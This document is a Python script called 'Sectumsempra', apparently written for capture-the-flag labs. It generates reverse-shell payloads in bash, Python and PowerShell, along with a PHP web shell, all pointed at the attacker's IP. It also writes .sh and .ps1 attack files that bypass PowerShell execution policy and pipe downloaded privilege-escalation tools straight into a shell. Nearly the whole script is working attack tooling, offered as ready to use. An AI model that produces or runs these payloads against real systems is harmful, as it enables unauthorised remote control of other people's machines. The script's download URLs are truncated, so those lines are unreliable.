import sys
import os
import re
import socket

def get_attack_ip():
    """Dynamically detects your local Kali or THM VPN interface IP address."""
    try:
        import netifaces
        if 'tun0' in netifaces.interfaces():
            return netifaces.ifaddresses('tun0')[socket.AF_INET]['addr']
    except Exception:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.10.10.10", 80))
        ip = s.getsockname()
        s.close()
        return ip[0]
    except Exception:
        return "YOUR_ATTACK_IP"

def generate_payloads(target_ip, attack_ip, lport):
    """Generates precise, weaponized reverse shell payloads based on targets."""
    payloads = {
        "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
        "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
        "windows_powershell": f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + $attack_ip + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}",
        "php_web": "<?php system($_GET['cmd']); ?>"
    }
    return payloads

def write_linux_slash(target_ip, payloads, lport):
    """Generates the lethal Linux deployment asset (.sh)."""
    filename = f"sectum_linux_strike_{target_ip.replace('.', '_')}.sh"
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write("#!/bin/bash\n")
        f.write(f"# ========================================================\n")
        f.write(f"# SECTUMSEMPRA LETHAL STRIKE (LINUX TACTICAL DEPLOYMENT)\n")
        f.write(f"# TARGET: {target_ip}\n")
        f.write(f"# ========================================================\n\n")
        
        f.write("echo '[*] Sectumsempra: Preparing execution environment...'\n")
        f.write(f"echo '[*] Setting up local listener instruction: nc -lvnp {lport}'\n\n")
        
        f.write("# 1. FOOTHOLD PAYLOADS\n")
        f.write("echo '[+] Step 1: Deploying Reverse Shell Weaponry...'\n")
        f.write(f"echo 'Raw Bash Weapon: {payloads['linux_bash']}'\n\n")
        
        f.write("# 2. AUTOMATED POST-EXPLOITATION PIPELINE\n")
        f.write("echo '[+] Step 2: Injecting PrivEsc & Flag Hunting Suite (LinPEAS)...'\n")
        f.write(f"echo 'Execute inside active shell: curl -sL https://github.com | sh'\n\n")
        
        f.write("echo '[+] Strike assets structured. Awaiting deployment.'\n")
        
    return filename

def write_windows_slash(target_ip, payloads, lport):
    """Generates the lethal Windows deployment asset (.ps1)."""
    filename = f"sectum_win_strike_{target_ip.replace('.', '_')}.ps1"
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write("# ========================================================\n")
        f.write(f"# SECTUMSEMPRA LETHAL STRIKE (WINDOWS TACTICAL DEPLOYMENT)\n")
        f.write(f"# TARGET: {target_ip}\n")
        f.write("# ========================================================\n\n")
        
        f.write("Write-Host '[*] Sectumsempra: Initiating Windows Vector...' -ForegroundColor Crimson\n")
        f.write("# 1. ENCODING POWERSHELL BYPASS\n")
        f.write("Write-Host '[+] Disabling Execution Policies...' -ForegroundColor Gray\n")
        f.write("Set-ExecutionPolicy Bypass -Scope Process -Force\n\n")
        
        f.write("# 2. FOOTHOLD PAYLOAD\n")
        f.write("Write-Host '[+] Staging Tactical Reverse Shell...' -ForegroundColor Gray\n")
        f.write(f"# Execute: {payloads['windows_powershell']}\n\n")
        
        f.write("# 3. AUTOMATED PRIVILEGE ESCALATION\n")
        f.write("Write-Host '[+] Pre-staging WinPEAS Network Download...' -ForegroundColor Gray\n")
        f.write(f"Write-Host 'Execute inside target shell: iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe'\n")
        
    return filename

def main():
    print("""
    ███████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
    ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
    ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██╗
    ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
    ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
    """)
    print(" >>> Sectumsempra v1.0 - The Lethal Execution & Post-Exploitation Edge <<<")
    
    print("Enter Target IP (from NetWeave): ", end="")
    target_ip = input().strip()
    if not target_ip: return
    
    attack_ip = get_attack_ip()
    print(f"[*] Detected Attack Infrastructure IP: {attack_ip}")
    
    print("Set Local Listener Port (LPORT) [Default 4444]: ", end="")
    lport_input = input().strip()
    lport = int(lport_input) if lport_input else 4444
    
    print("\n[*] Processing tactical intelligence data...")
    payloads = generate_payloads(target_ip, attack_ip, lport)
    
    linux_strike = write_linux_slash(target_ip, payloads, lport)
    win_strike = write_windows_slash(target_ip, payloads, lport)
    
    print("\n" + "="*30 + " SECTUMSEMPRA BLADE DEPLOYED " + "="*30)
    print(f"[███] LINUX SLICE READY:   {os.getcwd()}/{linux_strike} ⚔️")
    print(f"[███] WINDOWS SLICE READY: {os.getcwd()}/{win_strike} ⚔️")
    print("="*89)
    print(f"\n[!] TACTICAL INSTRUCTION:")
    print(f" 1. Start your local listener: nc -lvnp {lport}")
    print(f" 2. Deploy payloads generated in your working files against the target.")
    print(f" 3. Once inside, run the pre-staged PEAS commands to drop flag tracking and secure root/system.")

if __name__ == "__main__":
    main()
